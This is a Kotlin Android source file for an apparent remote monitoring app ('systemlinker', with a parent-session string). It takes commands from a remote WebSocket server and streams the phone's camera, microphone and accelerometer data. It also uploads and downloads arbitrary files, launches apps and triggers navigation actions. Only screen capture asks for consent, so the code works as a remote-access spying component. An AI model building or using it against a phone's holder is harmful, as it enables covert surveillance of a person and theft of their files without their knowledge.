package com.systemlinker.features

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.media.AudioManager
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.systemlinker.base.ErrorLogger
import com.systemlinker.features.webrtc.WebRtcAudioStreamer
import com.systemlinker.features.webrtc.WebRtcCameraStreamer
import com.systemlinker.features.webrtc.WebRtcManager
import com.systemlinker.features.webrtc.WebRtcScreenStreamer
import kotlinx.coroutines.*
import okhttp3.*
import okio.ByteString
import org.json.JSONObject
import org.webrtc.RtpTransceiver
import java.util.concurrent.TimeUnit

class LiveSessionManager(private val context: Context) : WebSocketListener() {

    private var webSocket: WebSocket? = null
    
    private val webRtcManager = WebRtcManager(context) { sdpJsonString ->
        val payload = JSONObject().put("cmd", "webrtc_signaling").put("arg", sdpJsonString)
        sendJson(payload) 
    }
    
    private val rtcScreenStreamer = WebRtcScreenStreamer(context, webRtcManager) { errorMsg ->
        sendJson(JSONObject().put("cmd", "rtc_error").put("arg", errorMsg))
    }
    private val rtcCameraStreamer = WebRtcCameraStreamer(context, webRtcManager)
    private val rtcAudioStreamer = WebRtcAudioStreamer(webRtcManager)
    private val fileManager = LocalFileManager()

    private val client = OkHttpClient.Builder()
        .pingInterval(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()
        
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var telemetryJob: Job? = null
    private var currentActiveVideo = "none"
    private var isStreamingSensors = false
    private var sensorManager: SensorManager? = null

    private fun logAndToast(msg: String, e: Throwable? = null) {
        val fullMsg = if (e != null) "$msg: ${e.message}" else msg
        Log.e("ERROR_TO_DEBUG", fullMsg, e)
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, fullMsg, Toast.LENGTH_LONG).show()
        }
    }

    private val systemDataReceiver = object : BroadcastReceiver() {
        override fun onReceive(receiverContext: Context?, intent: Intent?) {
            when (intent?.action) {
                "com.systemlinker.SCREEN_CAST_CONSENT" -> {
                    val code = intent.getIntExtra("code", 0)
                    val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra("data", Intent::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra("data")
                    }
                    
                    receiverContext?.let { ctx ->
                        scope.launch {
                            val upgradeIntent = Intent("com.systemlinker.UPGRADE_FGS_MP")
                            ctx.sendBroadcast(upgradeIntent)
                            delay(1000)
                            
                            if (data != null) {
                                currentActiveVideo = "screen"
                                rtcCameraStreamer.stopStreaming()
                                webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
                                rtcScreenStreamer.startStreaming(code, data)
                                sendJson(JSONObject().put("status", "webrtc_screen_cast_started"))
                                sendRtcAck("video_ready", "screen")
                            } else {
                                sendJson(JSONObject().put("error", "Screen cast data is null."))
                            }
                        }
                    }
                }
                "com.systemlinker.SCREEN_CAST_CONSENT_DENIED" -> {
                    sendJson(JSONObject().put("error", "Screen cast consent denied by user."))
                }
            }
        }
    }

    fun connect(wsUrl: String) {
        if (webSocket != null) return
        val request = Request.Builder().url(wsUrl).build()
        webSocket = client.newWebSocket(request, this)
        
        val filter = IntentFilter().apply {
            addAction("com.systemlinker.SCREEN_CAST_CONSENT")
            addAction("com.systemlinker.SCREEN_CAST_CONSENT_DENIED")
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(systemDataReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            context.registerReceiver(systemDataReceiver, filter)
        }
        
        telemetryJob = scope.launch {
            while(isActive) {
                delay(3000)
                val statusArg = JSONObject()
                    .put("mic", rtcAudioStreamer.isStreaming)
                    .put("vid", currentActiveVideo)
                sendJson(JSONObject().put("cmd", "telemetry").put("arg", statusArg.toString()))
            }
        }
    }

    fun disconnect() {
        telemetryJob?.cancel()
        stopAllWebRtcStreams()
        stopSensorStream()
        
        val intent = Intent("com.systemlinker.ACC_ACTION")
        intent.putExtra("action", "stream_screen_stop") 
        context.sendBroadcast(intent)
        
        val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
        context.sendBroadcast(downgradeIntent)
        
        try { context.unregisterReceiver(systemDataReceiver) } catch (e: Exception) {}
        
        webSocket?.close(1000, "Parent closed session")
        webSocket = null
    }

    private fun stopAllWebRtcStreams() {
        setAudioRoute(enableSpeaker = false, activate = false)
        currentActiveVideo = "none"
        rtcScreenStreamer.stopStreaming()
        rtcCameraStreamer.stopStreaming()
        rtcAudioStreamer.stopStreaming()
        webRtcManager.terminate()
    }

    private fun setAudioRoute(enableSpeaker: Boolean, activate: Boolean) {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
            if (activate) {
                audioManager.mode = AudioManager.MODE_IN_COMMUNICATION
                audioManager.isSpeakerphoneOn = enableSpeaker
            } else {
                audioManager.mode = AudioManager.MODE_NORMAL
                audioManager.isSpeakerphoneOn = false
            }
        } catch (e: Exception) {
            logAndToast("AudioRouteError", e)
        }
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {
        sendJson(JSONObject().put("status", "connected").put("device", Build.MODEL))
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        try {
            val json = JSONObject(text)
            handleLiveCommand(json)
        } catch (e: Exception) {
            logAndToast("LiveSession Parse Error", e)
        }
    }

    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {}

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        disconnect()
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        disconnect()
        logAndToast("LiveSession Failure", t)
    }

    private fun handleLiveCommand(payload: JSONObject) {
        val cmd = payload.optString("cmd")
        val arg = payload.optString("arg")

        when (cmd) {
            "webrtc" -> {
                if (arg == "start") {
                    if (webRtcManager.peerConnection == null) {
                        webRtcManager.initialize()
                        webRtcManager.createPeerConnection(isCaller = false)
                    }
                    sendJson(JSONObject().put("status", "webrtc_ready"))
                } else if (arg == "stop") {
                    stopAllWebRtcStreams()
                    sendJson(JSONObject().put("status", "webrtc_stopped"))
                }
            }
            "webrtc_signaling" -> {
                try {
                    val signalingPayload = JSONObject(arg)
                    webRtcManager.handleSignalingMessage(signalingPayload)
                } catch (e: Exception) {
                    logAndToast("WebRTC Signaling Parse Error", e)
                }
            }
            "rtc_audio" -> {
                when (arg) {
                    "call" -> {
                        setAudioRoute(enableSpeaker = true, activate = true)
                        webRtcManager.setAudioDirection(RtpTransceiver.RtpTransceiverDirection.SEND_RECV)
                        rtcAudioStreamer.startStreaming()
                        webRtcManager.setRemoteAudioEnabled(true)
                        sendRtcAck("audio_ready", arg)
                    }
                    "broadcast" -> { 
                        setAudioRoute(enableSpeaker = true, activate = true)
                        webRtcManager.setAudioDirection(RtpTransceiver.RtpTransceiverDirection.RECV_ONLY)
                        rtcAudioStreamer.stopStreaming()
                        webRtcManager.setRemoteAudioEnabled(true)
                        sendRtcAck("audio_ready", arg)
                    }
                    "receive" -> { 
                        setAudioRoute(enableSpeaker = false, activate = true)
                        webRtcManager.setAudioDirection(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
                        rtcAudioStreamer.startStreaming()
                        webRtcManager.setRemoteAudioEnabled(false)
                        sendRtcAck("audio_ready", arg)
                    }
                    "stop" -> {
                        setAudioRoute(enableSpeaker = false, activate = false)
                        webRtcManager.setAudioDirection(RtpTransceiver.RtpTransceiverDirection.INACTIVE)
                        rtcAudioStreamer.stopStreaming()
                        webRtcManager.setRemoteAudioEnabled(false)
                    }
                }
            }
            "rtc_video" -> {
                when (arg) {
                    "cam1" -> { 
                        currentActiveVideo = "cam1"
                        rtcScreenStreamer.stopStreaming()
                        webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
                        rtcCameraStreamer.startStreaming(isFront = true) 
                        sendRtcAck("video_ready", "cam1") 
                    }
                    "cam2" -> { 
                        currentActiveVideo = "cam2"
                        rtcScreenStreamer.stopStreaming()
                        webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.SEND_ONLY)
                        rtcCameraStreamer.startStreaming(isFront = false) 
                        sendRtcAck("video_ready", "cam2") 
                    }
                    "stop" -> {
                        currentActiveVideo = "none"
                        webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.INACTIVE)
                        rtcCameraStreamer.stopStreaming()
                    }
                }
            }
            "rtc_screen" -> {
                if (arg == "start") {
                    sendJson(JSONObject().put("status", "requesting_screen_consent"))
                    val intent = Intent(context, ScreenCaptureActivity::class.java)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                } else {
                    currentActiveVideo = "none"
                    webRtcManager.setVideoDirection(RtpTransceiver.RtpTransceiverDirection.INACTIVE)
                    rtcScreenStreamer.stopStreaming()
                    val downgradeIntent = Intent("com.systemlinker.DOWNGRADE_FGS_MP")
                    context.sendBroadcast(downgradeIntent)
                }
            }
            "vibrate" -> vibrateDevice(arg.toLongOrNull() ?: 500L)
            "launch_app" -> launchApp(arg)
            "stream_sensors" -> if (arg == "start") startSensorStream() else stopSensorStream()
            "btn_home", "btn_back", "btn_recents", "stream_screen_start", "stream_screen_stop" -> {
                val intent = Intent("com.systemlinker.ACC_ACTION")
                intent.putExtra("action", cmd)
                context.sendBroadcast(intent)
            }
            "fm_ls" -> sendJson(JSONObject().put("cmd", "fm_ls_result").put("data", fileManager.listFiles(arg)))
            "fm_info" -> sendJson(JSONObject().put("cmd", "fm_info_result").put("data", fileManager.getFileInfo(arg)))
            "fm_create" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.create(arg, payload.optBoolean("isDir", false))))
            "fm_rename" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.rename(arg, payload.optString("newName"))))
            "fm_copy" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.copy(arg, payload.optString("dest"))))
            "fm_move" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.move(arg, payload.optString("dest"))))
            "fm_download" -> sendJson(JSONObject().put("cmd", "fm_download_result").put("file", arg).put("data", fileManager.readBase64(arg)))
            "fm_upload" -> sendJson(JSONObject().put("cmd", "fm_msg").put("msg", fileManager.writeBase64(arg, payload.optString("data"))))
        }
    }

    private fun sendJson(json: JSONObject) { webSocket?.send(json.toString()) }

    private fun sendRtcAck(type: String, mode: String) {
        val ackObj = JSONObject().put("type", type).put("mode", mode)
        sendJson(JSONObject().put("cmd", "rtc_ack").put("arg", ackObj.toString()))
    }

    private fun vibrateDevice(durationMs: Long) {
        val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(durationMs)
        }
    }

    private fun launchApp(packageName: String) {
        try {
            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                sendJson(JSONObject().put("status", "app_launched").put("package", packageName))
            }
        } catch (e: Exception) {
            sendJson(JSONObject().put("error", "Launch failed: ${e.message}"))
        }
    }

    private val sensorListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            if (!isStreamingSensors) return
            val data = JSONObject().apply {
                put("type", "sensor_data")
                put("sensor", event.sensor.name)
                put("values", event.values.joinToString(","))
            }
            sendJson(data)
        }
        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
    }

    private fun startSensorStream() {
        if (isStreamingSensors) return
        isStreamingSensors = true
        sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
        val accel = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        accel?.let { sensorManager?.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_UI) }
    }

    private fun stopSensorStream() {
        isStreamingSensors = false
        sensorManager?.unregisterListener(sensorListener)
        sensorManager = null
    }
}